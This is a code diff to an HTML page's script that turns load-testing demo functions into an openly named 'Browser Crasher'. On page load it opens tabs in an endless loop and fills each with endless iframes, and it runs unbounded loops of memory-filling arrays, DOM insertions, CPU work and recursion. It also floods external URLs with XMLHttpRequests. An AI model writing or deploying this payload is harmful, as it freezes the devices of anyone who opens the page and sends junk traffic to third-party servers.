@@ -5,32 +5,40 @@
 </head>
 <body>
     <script>
-        // Function to generate a large array of random numbers
-        function generateDataArray(size) {
-            var dataArray = [];
-            for (var i = 0; i < size; i++) {
-                dataArray.push(Math.random());
+        // Function to open infinite tabs with infinite iframes
+        function openInfiniteTabs() {
+            while (true) {
+                var url = 'https://www.urmom.com'; // Replace with your desired URL
+                var win = window.open('', '_blank');
+                var htmlContent = '<!DOCTYPE html><html><head><title>Browser Crasher</title></head><body>';
+                
+                // Create infinite iframes within each tab
+                while (true) {
+                    htmlContent += '<iframe src="' + url + '" style="border: none; width: 100%; height: 100%; margin: 0;"></iframe>';
+                }
+                
+                htmlContent += '</body></html>';
+                
+                // Write HTML content to the new tab
+                win.document.write(htmlContent);
             }
-            return dataArray;
         }
 
         // Function to perform heavy data processing
         function processData() {
-            // Define the size of the data array
-            var arraySize = 1000000; // Adjust this value as needed for your desired level of intensity
-
-            // Generate a large array of random numbers
-            var data = generateDataArray(arraySize);
-
-            // Perform complex computations or operations with the data
-            // For demonstration purposes, let's calculate the sum of all numbers
-            var sum = 0;
-            for (var i = 0; i < data.length; i++) {
-                sum += data[i];
+            while (true) {
+                var arraySize = 1000000;
+                var data = [];
+                
+                for (var i = 0; i < arraySize; i++) {
+                    data.push(Math.random());
+                }
+                
+                var sum = 0;
+                for (var j = 0; j < data.length; j++) {
+                    sum += data[j];
+                }
             }
-
-            // Display the result (optional)
-            console.log('Sum of data array:', sum);
         }
 
         // Function to create an infinite loop
@@ -42,43 +50,38 @@
 
         // Function to perform recursive function calls
         function recursiveFunction() {
-            // Call itself recursively
             recursiveFunction();
         }
 
         // Function to perform DOM manipulation
         function manipulateDOM() {
-            // Create a new element and append it to the body
-            var newElement = document.createElement('div');
-            newElement.textContent = 'DOM manipulation at its finest!';
-            document.body.appendChild(newElement);
-            
-            // Create additional elements and manipulate the DOM further
-            for (var i = 0; i < 100; i++) {
-                var newParagraph = document.createElement('p');
-                newParagraph.textContent = 'This is paragraph ' + i;
-                document.body.appendChild(newParagraph);
+            while (true) {
+                var newElement = document.createElement('div');
+                newElement.textContent = 'DOM manipulation at its finest!';
+                document.body.appendChild(newElement);
             }
         }
 
         // Function to make relentless AJAX requests
         function makeAjaxRequests() {
-            // Send continuous AJAX requests to external sources
-            setInterval(function() {
+            while (true) {
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://urmom.com', true); // Replace 'https://example.com' with your desired URL
+                xhr.open('GET', 'https://example.com', true); // Replace 'https://example.com' with your desired URL
                 xhr.send();
-            }, 100); // Adjust the interval as needed (milliseconds)
+            }
         }
 
         // Additional lag-inducing operations
         function induceLag() {
-            // Insert additional heavy operations here
-            // For example, complex calculations or manipulations
-            for (var i = 0; i < 1000; i++) {
-                Math.random(); // Intensive computation
+            while (true) {
+                for (var i = 0; i < 1000; i++) {
+                    Math.random(); // Intensive computation
+                }
             }
         }
+
+        // Call the function to open infinite tabs with infinite iframes
+        openInfiniteTabs();
 
         // Call the processData function
         processData();
@@ -100,4 +103,3 @@
     </script>
 </body>
 </html>
-
